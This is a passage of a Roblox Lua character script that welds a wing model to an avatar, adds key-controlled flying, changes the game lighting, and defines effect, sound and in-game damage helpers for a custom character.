w25.Name = "Part_Weld"
w25.Part0 = p25
w25.C0 = CFrame.new(-4.6974678, 13.5492172, -44.6714172, -0.573576748, -2.87868307e-008, 0.819151878, 0.212012202, -0.965925753, 0.148452699, 0.791239858, 0.258819222, 0.554032564)
w25.Part1 = p26
w25.C1 = CFrame.new(-4.69747162, 10.7813015, -45.6837234, -0.573576748, 0, 0.819151878, 0.280166447, -0.939692616, 0.1961748, 0.769751072, 0.342020154, 0.538985789)
w26 = Instance.new("Weld", p26)
w26.Name = "Part_Weld"
w26.Part0 = p26
w26.C0 = CFrame.new(-4.69747162, 10.7813015, -45.6837234, -0.573576748, 0, 0.819151878, 0.280166447, -0.939692616, 0.1961748, 0.769751072, 0.342020154, 0.538985789)
w26.Part1 = p27
w26.C1 = CFrame.new(-4.6974678, 38.4699554, -26.5923309, -0.573576748, -1.03064551e-007, 0.819151878, -0.346188426, -0.906307817, -0.242403746, 0.742403686, -0.422618032, 0.519837141)
w27 = Instance.new("Weld", p27)
w27.Name = "Part_Weld"
w27.Part0 = p27
w27.C0 = CFrame.new(-4.6974678, 38.4699554, -26.5923309, -0.573576748, -1.03064551e-007, 0.819151878, -0.346188426, -0.906307817, -0.242403746, 0.742403686, -0.422618032, 0.519837141)
w27.Part1 = p28
w27.C1 = CFrame.new(-4.6974678, -0.249424934, -45.600399, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w28 = Instance.new("Weld", p28)
w28.Name = "Part_Weld"
w28.Part0 = p28
w28.C0 = CFrame.new(-4.6974678, -0.249424934, -45.600399, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w28.Part1 = p29
w28.C1 = CFrame.new(-36.0110359, 31.0260429, -4.71271896, 0.280166358, 0.93969208, 0.196174681, -0.769750178, 0.342019618, -0.538985252, -0.57357645, -2.95716429e-008, 0.819151998)
w29 = Instance.new("Weld", p29)
w29.Name = "Part_Weld"
w29.Part0 = p29
w29.C0 = CFrame.new(-36.0110359, 31.0260429, -4.71271896, 0.280166358, 0.93969208, 0.196174681, -0.769750178, 0.342019618, -0.538985252, -0.57357645, -2.95716429e-008, 0.819151998)
w29.Part1 = p30
w29.C1 = CFrame.new(-4.69746971, 13.5492201, -44.5157242, -0.573576748, -2.87868307e-008, 0.819151878, 0.212012202, -0.965925753, 0.148452699, 0.791239858, 0.258819222, 0.554032564)
w30 = Instance.new("Weld", p30)
w30.Name = "Part_Weld"
w30.Part0 = p30
w30.C0 = CFrame.new(-4.69746971, 13.5492201, -44.5157242, -0.573576748, -2.87868307e-008, 0.819151878, 0.212012202, -0.965925753, 0.148452699, 0.791239858, 0.258819222, 0.554032564)
w30.Part1 = p31
w30.C1 = CFrame.new(-4.69746971, 38.4699554, -26.2856503, -0.573576748, -1.03064551e-007, 0.819151878, -0.346188426, -0.906307817, -0.242403746, 0.742403686, -0.422618032, 0.519837141)
w31 = Instance.new("Weld", p31)
w31.Name = "Part_Weld"
w31.Part0 = p31
w31.C0 = CFrame.new(-4.69746971, 38.4699554, -26.2856503, -0.573576748, -1.03064551e-007, 0.819151878, -0.346188426, -0.906307817, -0.242403746, 0.742403686, -0.422618032, 0.519837141)
w31.Part1 = p32
w31.C1 = CFrame.new(-4.6974678, 0.512617111, -45.717083, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w32 = Instance.new("Weld", p32)
w32.Name = "Part_Weld"
w32.Part0 = p32
w32.C0 = CFrame.new(-4.6974678, 0.512617111, -45.717083, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w32.Part1 = p33
w32.C1 = CFrame.new(-17.3583775, 46.9591446, -4.71270752, -0.142244235, 0.98480773, -0.0996004939, -0.806707144, -0.173648238, -0.564862549, -0.57357657, 0, 0.819151998)
w33 = Instance.new("Weld", p33)
w33.Name = "Part_Weld"
w33.Part0 = p33
w33.C0 = CFrame.new(-17.3583775, 46.9591446, -4.71270752, -0.142244235, 0.98480773, -0.0996004939, -0.806707144, -0.173648238, -0.564862549, -0.57357657, 0, 0.819151998)
w33.Part1 = p34
w33.C1 = CFrame.new(-4.69747162, -0.249425888, -45.4494095, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w34 = Instance.new("Weld", p34)
w34.Name = "Part_Weld"
w34.Part0 = p34
w34.C0 = CFrame.new(-4.69747162, -0.249425888, -45.4494095, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w34.Part1 = p35
w34.C1 = CFrame.new(-4.69746971, 13.5492172, -44.8224106, -0.573576748, -2.87868307e-008, 0.819151878, 0.212012202, -0.965925753, 0.148452699, 0.791239858, 0.258819222, 0.554032564)
w35 = Instance.new("Weld", p35)
w35.Name = "Part_Weld"
w35.Part0 = p35
w35.C0 = CFrame.new(-4.69746971, 13.5492172, -44.8224106, -0.573576748, -2.87868307e-008, 0.819151878, 0.212012202, -0.965925753, 0.148452699, 0.791239858, 0.258819222, 0.554032564)
w35.Part1 = p36
w35.C1 = CFrame.new(-4.69746971, -0.249427795, -45.2937202, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w36 = Instance.new("Weld", p36)
w36.Name = "Part_Weld"
w36.Part0 = p36
w36.C0 = CFrame.new(-4.69746971, -0.249427795, -45.2937202, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w36.Part1 = p37
w36.C1 = CFrame.new(-3.70028734, 49.2830544, -4.71271324, -0.409575999, 0.866025388, -0.286788285, -0.709406435, -0.5, -0.496731967, -0.57357657, 0, 0.819151998)
w37 = Instance.new("Weld", p37)
w37.Name = "Part_Weld"
w37.Part0 = p37
w37.C0 = CFrame.new(-3.70028734, 49.2830544, -4.71271324, -0.409575999, 0.866025388, -0.286788285, -0.709406435, -0.5, -0.496731967, -0.57357657, 0, 0.819151998)
w37.Part1 = p38
w37.C1 = CFrame.new(-10.7698097, 49.927597, -4.71271324, -0.280166447, 0.939692616, -0.196174681, -0.769750953, -0.342020154, -0.53898561, -0.57357657, 0, 0.819151998)
w38 = Instance.new("Weld", p38)
w38.Name = "Part_Weld"
w38.Part0 = p38
w38.C0 = CFrame.new(-10.7698097, 49.927597, -4.71271324, -0.280166447, 0.939692616, -0.196174681, -0.769750953, -0.342020154, -0.53898561, -0.57357657, 0, 0.819151998)
w38.Part1 = p39
w38.C1 = CFrame.new(35.7379837, 25.1083565, -9.07904911, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w39 = Instance.new("Weld", p39)
w39.Name = "Part_Weld"
w39.Part0 = p39
w39.C0 = CFrame.new(35.7379837, 25.1083565, -9.07904911, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w39.Part1 = p40
w39.C1 = CFrame.new(35.7379837, 25.1083584, -9.38572502, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w40 = Instance.new("Weld", p40)
w40.Name = "Part_Weld"
w40.Part0 = p40
w40.C0 = CFrame.new(35.7379837, 25.1083584, -9.38572502, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w40.Part1 = p41
w40.C1 = CFrame.new(35.7379875, 25.1083603, -9.23473454, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w41 = Instance.new("Weld", p41)
w41.Name = "Part_Weld"
w41.Part0 = p41
w41.C0 = CFrame.new(35.7379875, 25.1083603, -9.23473454, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w41.Part1 = p42
w41.C1 = CFrame.new(35.7379913, 24.9916019, -2.11887932, -0.573576331, -2.87868307e-008, -0.819152117, -0.212012321, -0.965925753, 0.14845252, -0.791240156, 0.258819222, 0.554032147)
w42 = Instance.new("Weld", p42)
w42.Name = "Part_Weld"
w42.Part0 = p42
w42.C0 = CFrame.new(35.7379913, 24.9916019, -2.11887932, -0.573576331, -2.87868307e-008, -0.819152117, -0.212012321, -0.965925753, 0.14845252, -0.791240156, 0.258819222, 0.554032147)
w42.Part1 = p43
w42.C1 = CFrame.new(35.7379913, 24.9916019, -2.11887932, -0.573576331, -2.87868307e-008, -0.819152117, -0.212012321, -0.965925753, 0.14845252, -0.791240156, 0.258819222, 0.554032147)
w43 = Instance.new("Weld", p43)
w43.Name = "Part_Weld"
w43.Part0 = p43
w43.C0 = CFrame.new(35.7379913, 24.9916019, -2.11887932, -0.573576331, -2.87868307e-008, -0.819152117, -0.212012321, -0.965925753, 0.14845252, -0.791240156, 0.258819222, 0.554032147)
w43.Part1 = p44
w43.C1 = CFrame.new(35.7379913, 24.9916058, -1.81219578, -0.573576331, -2.87868307e-008, -0.819152117, -0.212012321, -0.965925753, 0.14845252, -0.791240156, 0.258819222, 0.554032147)
w44 = Instance.new("Weld", p44)
w44.Name = "Part_Weld"
w44.Part0 = p44
w44.C0 = CFrame.new(35.7379913, 24.9916058, -1.81219578, -0.573576331, -2.87868307e-008, -0.819152117, -0.212012321, -0.965925753, 0.14845252, -0.791240156, 0.258819222, 0.554032147)
w44.Part1 = p45
w44.C1 = CFrame.new(35.7379913, 24.9916019, -1.96789074, -0.573576331, -2.87868307e-008, -0.819152117, -0.212012321, -0.965925753, 0.14845252, -0.791240156, 0.258819222, 0.554032147)
w45 = Instance.new("Weld", p45)
w45.Name = "Part_Weld"
w45.Part0 = p45
w45.C0 = CFrame.new(35.7379913, 24.9916019, -1.96789074, -0.573576331, -2.87868307e-008, -0.819152117, -0.212012321, -0.965925753, 0.14845252, -0.791240156, 0.258819222, 0.554032147)
w45.Part1 = p46
w45.C1 = CFrame.new(35.7379913, 24.9916058, -1.81219578, -0.573576331, -2.87868307e-008, -0.819152117, -0.212012321, -0.965925753, 0.14845252, -0.791240156, 0.258819222, 0.554032147)
w46 = Instance.new("Weld", p46)
w46.Name = "Part_Weld"
w46.Part0 = p46
w46.C0 = CFrame.new(35.7379913, 24.9916058, -1.81219578, -0.573576331, -2.87868307e-008, -0.819152117, -0.212012321, -0.965925753, 0.14845252, -0.791240156, 0.258819222, 0.554032147)
w46.Part1 = p47
w46.C1 = CFrame.new(35.7379913, 24.9916019, -1.96789074, -0.573576331, -2.87868307e-008, -0.819152117, -0.212012321, -0.965925753, 0.14845252, -0.791240156, 0.258819222, 0.554032147)
w47 = Instance.new("Weld", p47)
w47.Name = "Part_Weld"
w47.Part0 = p47
w47.C0 = CFrame.new(35.7379913, 24.9916019, -1.96789074, -0.573576331, -2.87868307e-008, -0.819152117, -0.212012321, -0.965925753, 0.14845252, -0.791240156, 0.258819222, 0.554032147)
w47.Part1 = p48
w47.C1 = CFrame.new(-23.7728367, 15.5624714, 35.7227516, 0.579227924, 0.707106769, -0.405579776, 0.579227865, -0.707106769, -0.405579716, -0.57357645, 0, -0.819151998)
w48 = Instance.new("Weld", p48)
w48.Name = "Part_Weld"
w48.Part0 = p48
w48.C0 = CFrame.new(-23.7728367, 15.5624714, 35.7227516, 0.579227924, 0.707106769, -0.405579776, 0.579227865, -0.707106769, -0.405579716, -0.57357645, 0, -0.819151998)
w48.Part1 = p49
w48.C1 = CFrame.new(35.7379837, 25.1083565, -9.07904911, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w49 = Instance.new("Weld", p49)
w49.Name = "Part_Weld"
w49.Part0 = p49
w49.C0 = CFrame.new(35.7379837, 25.1083565, -9.07904911, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w49.Part1 = p50
w49.C1 = CFrame.new(35.7379837, 25.1083584, -9.38572502, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w50 = Instance.new("Weld", p50)
w50.Name = "Part_Weld"
w50.Part0 = p50
w50.C0 = CFrame.new(35.7379837, 25.1083584, -9.38572502, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w50.Part1 = p51
w50.C1 = CFrame.new(35.7379875, 25.1083603, -9.23473454, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w51 = Instance.new("Weld", p51)
w51.Name = "Part_Weld"
w51.Part0 = p51
w51.C0 = CFrame.new(35.7379875, 25.1083603, -9.23473454, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w51.Part1 = p52
w51.C1 = CFrame.new(-25.0353527, 3.42085648, 35.7227554, 0.142244235, 0.98480773, -0.0996005014, 0.806707203, -0.173648238, -0.56486249, -0.57357645, 0, -0.819151998)
w52 = Instance.new("Weld", p52)
w52.Name = "Part_Weld"
w52.Part0 = p52
w52.C0 = CFrame.new(-25.0353527, 3.42085648, 35.7227554, 0.142244235, 0.98480773, -0.0996005014, 0.806707203, -0.173648238, -0.56486249, -0.57357645, 0, -0.819151998)
w52.Part1 = p53
w52.C1 = CFrame.new(-25.8052597, 10.9961138, 35.7227554, 0.409575999, 0.866025388, -0.286788225, 0.709406435, -0.5, -0.496731758, -0.57357645, 0, -0.819151998)
w53 = Instance.new("Weld", p53)
w53.Name = "Part_Weld"
w53.Part0 = p53
w53.C0 = CFrame.new(-25.8052597, 10.9961138, 35.7227554, 0.409575999, 0.866025388, -0.286788225, 0.709406435, -0.5, -0.496731758, -0.57357645, 0, -0.819151998)
w53.Part1 = p54
w53.C1 = CFrame.new(-25.8904991, 8.38383961, 35.7227592, 0.280166447, 0.939692616, -0.196174681, 0.769751012, -0.342020154, -0.538985491, -0.57357645, 0, -0.819151998)
w54 = Instance.new("Weld", p54)
w54.Name = "Part_Weld"
w54.Part0 = p54
w54.C0 = CFrame.new(-25.8904991, 8.38383961, 35.7227592, 0.280166447, 0.939692616, -0.196174681, 0.769751012, -0.342020154, -0.538985491, -0.57357645, 0, -0.819151998)
w54.Part1 = p55
w54.C1 = CFrame.new(-20.8903503, -10.5176811, 35.7227554, -0.280166388, 0.93969208, 0.196174622, 0.769750416, 0.342019618, -0.538984895, -0.57357651, -2.95716429e-008, -0.819151938)
w55 = Instance.new("Weld", p55)
w55.Name = "Part_Weld"
w55.Part0 = p55
w55.C0 = CFrame.new(-20.8903503, -10.5176811, 35.7227554, -0.280166388, 0.93969208, 0.196174622, 0.769750416, 0.342019618, -0.538984895, -0.57357651, -2.95716429e-008, -0.819151938)
w55.Part1 = p56
w55.C1 = CFrame.new(35.7379799, 25.8704014, -9.65809727, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w56 = Instance.new("Weld", p56)
w56.Name = "Part_Weld"
w56.Part0 = p56
w56.C0 = CFrame.new(35.7379799, 25.8704014, -9.65809727, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w56.Part1 = p57
w56.C1 = CFrame.new(35.7379799, 25.8703995, -9.8090868, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w57 = Instance.new("Weld", p57)
w57.Name = "Part_Weld"
w57.Part0 = p57
w57.C0 = CFrame.new(35.7379799, 25.8703995, -9.8090868, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w57.Part1 = p58
w57.C1 = CFrame.new(35.7379875, 25.8704014, -9.50240993, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w58 = Instance.new("Weld", p58)
w58.Name = "Part_Weld"
w58.Part0 = p58
w58.C0 = CFrame.new(35.7379875, 25.8704014, -9.50240993, -0.573576331, 0, -0.819152117, -0.469846368, -0.819152057, 0.328989863, -0.671010137, 0.57357645, 0.469846219)
w58.Part1 = p59
w58.C1 = CFrame.new(35.7379913, 25.9019985, -3.98426342, -0.573576331, 0, -0.819152117, -0.280166537, -0.939692616, 0.196174636, -0.769751191, 0.342020154, 0.538985431)
w59 = Instance.new("Weld", p59)
w59.Name = "Part_Weld"
w59.Part0 = p59
w59.C0 = CFrame.new(35.7379913, 25.9019985, -3.98426342, -0.573576331, 0, -0.819152117, -0.280166537, -0.939692616, 0.196174636, -0.769751191, 0.342020154, 0.538985431)
w59.Part1 = p60
w59.C1 = CFrame.new(35.7379875, 25.9019947, -4.29094791, -0.573576331, 0, -0.819152117, -0.280166537, -0.939692616, 0.196174636, -0.769751191, 0.342020154, 0.538985431)
w60 = Instance.new("Weld", p60)
w60.Name = "Part_Weld"
w60.Part0 = p60
w60.C0 = CFrame.new(35.7379875, 25.9019947, -4.29094791, -0.573576331, 0, -0.819152117, -0.280166537, -0.939692616, 0.196174636, -0.769751191, 0.342020154, 0.538985431)
w60.Part1 = p61
w60.C1 = CFrame.new(35.7379875, 25.9019966, -4.13995552, -0.573576331, 0, -0.819152117, -0.280166537, -0.939692616, 0.196174636, -0.769751191, 0.342020154, 0.538985431)
w61 = Instance.new("Weld", p61)
w61.Name = "Part_Weld"
w61.Part0 = p61
w61.C0 = CFrame.new(35.7379875, 25.9019966, -4.13995552, -0.573576331, 0, -0.819152117, -0.280166537, -0.939692616, 0.196174636, -0.769751191, 0.342020154, 0.538985431)
w61.Part1 = p62
w61.C1 = CFrame.new(35.7379913, 25.9019985, -3.98426342, -0.573576331, 0, -0.819152117, -0.280166537, -0.939692616, 0.196174636, -0.769751191, 0.342020154, 0.538985431)
w62 = Instance.new("Weld", p62)
w62.Name = "Part_Weld"
w62.Part0 = p62
w62.C0 = CFrame.new(35.7379913, 25.9019985, -3.98426342, -0.573576331, 0, -0.819152117, -0.280166537, -0.939692616, 0.196174636, -0.769751191, 0.342020154, 0.538985431)
w62.Part1 = p63
w62.C1 = CFrame.new(35.7379875, 25.9019947, -4.29094791, -0.573576331, 0, -0.819152117, -0.280166537, -0.939692616, 0.196174636, -0.769751191, 0.342020154, 0.538985431)
w63 = Instance.new("Weld", p63)
w63.Name = "Part_Weld"
w63.Part0 = p63
w63.C0 = CFrame.new(35.7379875, 25.9019947, -4.29094791, -0.573576331, 0, -0.819152117, -0.280166537, -0.939692616, 0.196174636, -0.769751191, 0.342020154, 0.538985431)
w63.Part1 = p64
w63.C1 = CFrame.new(35.7379875, 25.9019966, -4.13995552, -0.573576331, 0, -0.819152117, -0.280166537, -0.939692616, 0.196174636, -0.769751191, 0.342020154, 0.538985431)
w64 = Instance.new("Weld", p64)
w64.Name = "TorsoPart_Weld"
w64.Part0 = p64
w64.C0 = CFrame.new(35.7379875, 25.9019966, -4.13995552, -0.573576331, 0, -0.819152117, -0.280166537, -0.939692616, 0.196174636, -0.769751191, 0.342020154, 0.538985431)
w64.Part1 = p65
w64.C1 = CFrame.new(-27.0399971, -25.1251144, -25.3600025, 1, 0, 0, 0, 1, 0, 0, 0, 1)
m2.Parent = char
m2:MakeJoints()
--------------------------------------------------------------------------------
local cor2 = Instance.new("Part", char.Wings)
cor2.Name = "Thingy"
cor2.Locked = true
cor2.BottomSurface = 0
cor2.CanCollide = false
cor2.Size = Vector3.new(0.2, 0.2, 0.2)
cor2.Transparency = 1
cor2.TopSurface = 0
corw2 = Instance.new("Weld", cor2)
corw2.Part0 = torso
corw2.Part1 = cor2
corw2.C0 = CFrame.new(0, 0.7, 0.8) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0))
corw2.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))
weld2 = Instance.new("Weld", char.Wings)
weld2.Part0 = cor2
weld2.Part1 = char.Wings.TorsoPart
weld2.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))







rainbowNumber = 1

local model = Instance.new("Model", char)
model.Name = "x10Wand"
local player = game.Players.LocalPlayer
local pchar = player.Character
local mouse = player:GetMouse()
local cam = workspace.CurrentCamera

local rad = math.rad
bodyparts = {}
local keysDown = {}
local flySpeed = 0
local MAX_FLY_SPEED = 150

local canFly = false
local flyToggled = false

local forward, side = 0, 0
local lastForward, lastSide = 0, 0

local floatBP = Instance.new("BodyPosition")
floatBP.maxForce = Vector3.new(0, math.huge, 0)
local flyBV = Instance.new("BodyVelocity")
flyBV.maxForce = Vector3.new(9e9, 9e9, 9e9)
local turnBG = Instance.new("BodyGyro")
turnBG.maxTorque = Vector3.new(math.huge, math.huge, math.huge)

mouse.KeyDown:connect(function(key)
        keysDown[key] = true

        if key == "f" then
                flyToggled = not flyToggled

        if not flyToggled then
                stanceToggle = "Normal"
                floatBP.Parent = nil
                flyBV.Parent = nil
                turnBG.Parent = nil
                root.Velocity = Vector3.new()
                pchar.Humanoid.PlatformStand = false
        end
end

end)
mouse.KeyUp:connect(function(key)
        keysDown[key] = nil
end)

local function updateFly()
	
	
	

        if not flyToggled then return end

        lastForward = forward
        lastSide = side

        forward = 0
        side = 0

        if keysDown.w then
                forward = forward + 1
        end
        if keysDown.s then
                forward = forward - 1
        end
        if keysDown.a then
                side = side - 1
        end
        if keysDown.d then
                side = side + 1
        end

        canFly = (forward ~= 0 or side ~= 0)

        if canFly then
                stanceToggle = "Floating"
                turnBG.Parent = root
                floatBP.Parent = nil
                flyBV.Parent = root

                flySpeed = flySpeed + 1 + (flySpeed / MAX_FLY_SPEED)
                if flySpeed > MAX_FLY_SPEED then flySpeed = MAX_FLY_SPEED end
        else
                floatBP.position = root.Position
                floatBP.Parent = root

                flySpeed = flySpeed - 1
                if flySpeed < 0 then flySpeed = 0 end
        end

        local camCF = cam.CoordinateFrame
        local in_forward = canFly and forward or lastForward
        local in_side = canFly and side or lastSide

        flyBV.velocity = ((camCF.lookVector * in_forward) + (camCF * CFrame.new(in_side,in_forward * 0.2, 0).p) - camCF.p) * flySpeed

        turnBG.cframe = camCF * CFrame.Angles(-rad(forward * (flySpeed / MAX_FLY_SPEED)), 0,0)
end

game:service'RunService'.RenderStepped:connect(function()
        if flyToggled then
                pchar.Humanoid.PlatformStand = true
        end
        updateFly()
end)





local TBlast, TBMesh = Instance.new("Part"), Instance.new("SpecialMesh")
	TBlast.BrickColor = BrickColor.new("Lime green")
	TBlast.Transparency = 1
	TBlast.Anchored = true
	TBlast.CanCollide = false
	TBlast.CFrame = root.CFrame
	TBlast.Size = Vector3.new(2,2,2)
	TBMesh.Parent = TBlast
	TBMesh.MeshType = "Sphere"
	game.Lighting.Brightness = 0
		game.Lighting.OutdoorAmbient = TBlast.BrickColor.Color
		game.Lighting.TimeOfDay = 0.1
		game.Lighting.FogEnd = 1000
		game.Lighting.FogColor = TBlast.BrickColor.Color
		game.Lighting.TimeOfDay = "00:00:00"
		game.Lighting.Ambient = Color3.new(0,0,0)
		game.Lighting.FogColor = Color3.new(0,0,0)
		game.Lighting.FogEnd = 500
		game.Lighting.FogStart = 0
		game.Lighting.GlobalShadows = true
		


function ClearEffects()
	for i, v in ipairs(CurrentEffects) do
		v:Remove()
		v:Destroy()
		game:GetService("Debris"):AddItem(v,0)
		table.remove(CurrentEffects,i)
	end
end
Human.WalkSpeed=26
function defpos()
	Neck.C0 = necko
		LH.C0 = LHC0
		LS.C0 = LSC0
		RH.C0 = RHC0
		RS.C0 = RSC0
	RootJoint.C0 = ROOTC0
end

function newpos()
	defpos()
			RS.C0=clerp(RS.C0,RS.C0*angles(rad(-50),0,0),.3)
			LS.C0=clerp(LS.C0,LS.C0*angles(rad(-50),0,0),.3)
			RH.C0=clerp(RH.C0,RH.C0*angles(rad(-25),0,0),.3)
			LH.C0=clerp(LH.C0,LH.C0*angles(rad(-25),0,0),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootJoint.C0*cf(0,0,1),1)
end
function PEE(part,size,col3,Lemission,trans,accel,ltp,edirection,enabled,lifetime,rate,rotation,rotspeed,speed,velspread,name,text)
	local p=it("ParticleEmitter",part)
	p.Size=size
	p.Texture=text
	p.Color=col3
	p.LightEmission=Lemission
	p.Transparency=trans
	p.Acceleration=accel
	p.LockedToPart=ltp
	p.EmissionDirection=edirection
	p.Enabled=enabled
	p.Lifetime=lifetime
	p.Rate=rate
	p.Rotation=rotation
	p.RotSpeed=rotspeed
	p.Speed=speed
	p.VelocitySpread=velspread
	p.Name=name
	return p
end

gui = function(GuiType, parent, text, backtrans, backcol, pos, size)
	local gui = Instance.new(GuiType)
	gui.Parent = parent
	gui.Text = text
	gui.BackgroundTransparency = backtrans
	gui.BackgroundColor3 = backcol
	gui.SizeConstraint = "RelativeXY"
	gui.TextXAlignment = "Center"
	gui.TextYAlignment = "Center"
	gui.Position = pos
	gui.Size = size
	gui.Font = "SourceSans"
	gui.FontSize = "Size60"
	gui.TextWrapped = false
	gui.TextStrokeTransparency = 0
	gui.TextColor = BrickColor.new("Lime green")
	return gui
end

part=function(parent,anchored,cancollide,size,cframe,col3,material,trans)
	local p=it("Part",parent)
	p.Anchored=anchored
	p.CanCollide=cancollide
	p.Size=size
	p.CFrame=cframe
	p.Color=col3
	p.Material=material
	p.Transparency=trans
	return p
end

BillboardGui = function(image, position, size)
  local billpar = Instance.new("Part")
  billpar.Transparency = 1
  billpar.formFactor = "Custom"
  billpar.Size = Vector3.new(1, 1, 1)
  billpar.Anchored = true
  billpar.CanCollide = false
  billpar.CFrame = CFrame.new(position)
  billpar.Name = "BillboardGuiPart"
  local bill = Instance.new("BillboardGui", billpar)
  bill.Adornee = billpar
  bill.Size = UDim2.new(1, 0, 1, 0)
  bill.SizeOffset = Vector2.new(size, size)
  local d = Instance.new("ImageLabel", bill)
  d.BackgroundTransparency = 1
  d.Size = UDim2.new(1, 0, 1, 0)
  d.Image = image
  return billpar
end

RealDamage = function(part,min,max,radius)
coroutine.resume(coroutine.create(function()
    for i,v in pairs(workspace:children()) do
        if v:FindFirstChild'Humanoid' and v:FindFirstChild'Torso' then
            if v.Name == game.Players.LocalPlayer.Name then else
            print((v.Torso.Position - part.Position).magnitude)
            if ((v.Torso.Position - part.Position).magnitude <= radius) then
				local hpdmg=math.random(min,max)
                v.Humanoid.Health = v.Humanoid.Health - hpdmg
				print"0"
				print"1"
				local Dbil=it("BillboardGui", v.Torso)
				Dbil.Adornee=v.Torso
				Dbil.Size=UDim2.new(0, 500, 0, 500)
				Dbil.SizeOffset=Vector2.new(0,0)
				Dbil.AlwaysOnTop=true
				Dbil.ExtentsOffset=Vector3.new(ran(-3,3),ran(-3,3),ran(-3,3))
				table.insert(CurrentDamages,Dbil)
				print"2"
				local goo=gui("TextLabel",Dbil,""..hpdmg.."",1,Color3.new(0,0,0),UDim2.new(0, 0, 0, 0),UDim2.new(1, 0, 1, 0))
				table.insert(CurrentDamages,goo)
				print"3"
          		for i=1,10 do
	wait()
	goo.TextTransparency=i/10
end
for a,b in pairs(CurrentDamages) do
	b:Remove()
		b:Destroy()
		game:GetService("Debris"):AddItem(b,0)
		table.remove(CurrentEffects,a)
end

            end
            end
        end
    end
end))
end

smoothNO=function(ppart)
	ppart.TopSurface=10
	ppart.BottomSurface=10
	ppart.BackSurface=10
	ppart.FrontSurface=10
	ppart.LeftSurface=10
	ppart.RightSurface=10
	return ppart
end

smoothO=function(ppart)
	ppart.TopSurface=0
	ppart.BottomSurface=0
	ppart.BackSurface=0
	ppart.FrontSurface=0
	ppart.LeftSurface=0
	ppart.RightSurface=0
end

sound=function(parent,id,vol,looped)
	local s=it("Sound",parent)
	s.SoundId=id
	s.Volume=vol
	s.Looped=looped
	return s
end

mesh=function(parent,ttype,scale)
	local m=it("SpecialMesh",parent)
	m.MeshType=ttype
	m.Scale=scale
	return m
end

spmesh=function(parent,id,scale)
	local m=it("SpecialMesh",parent)
	m.MeshId=id
	m.Scale=scale
	return m
end


			
			
local EyePart=part(Char,false,false,v3(.3,.3,.3),Torso.CFrame,c3(0,1,0),"Neon",0)
EyePart.Name="EyePart"
EyePart.Shape="Ball"
local EyeWeld=it("Weld",Char)
EyeWeld.Part0=EyePart
EyeWeld.Part1=Head
EyeWeld.C0=EyeWeld.C0*cf(.2,-.25,.578)
local EyeSizes={
	NumberSequenceKeypoint.new(0,.4,0),
	NumberSequenceKeypoint.new(1,0,0)
}
local EyeTrans={
	NumberSequenceKeypoint.new(0,0,0),
	NumberSequenceKeypoint.new(1,1,0)
}
local PE=it("ParticleEmitter",EyePart)
PE.LightEmission=.4
PE.LockedToPart=true
PE.Size=NumberSequence.new(EyeSizes)
PE.Transparency=NumberSequence.new(EyeTrans)
PE.Acceleration=v3(2,0,0)
PE.Lifetime=NumberRange.new(2,2,2)
PE.Rate=70
PE.Speed=NumberRange.new(4,4,4)
PE.Texture="rbxassetid://300899374"

local function RisingAndRotatingParts(Parent,Cframe,Col1,Col2,Time,Material,Size)
local Colours = {BrickColor.new(Col1),BrickColor.new(Col2)}

local flame1 = Instance.new("Part",Parent)
flame1.Anchored = true
flame1.CanCollide =false
flame1.CFrame = Cframe
flame1.Material = Material
flame1.TopSurface = 0
flame1.BottomSurface = 0
flame1.Size = Size
flame1.BrickColor = Colours[math.random(1,#Colours)]

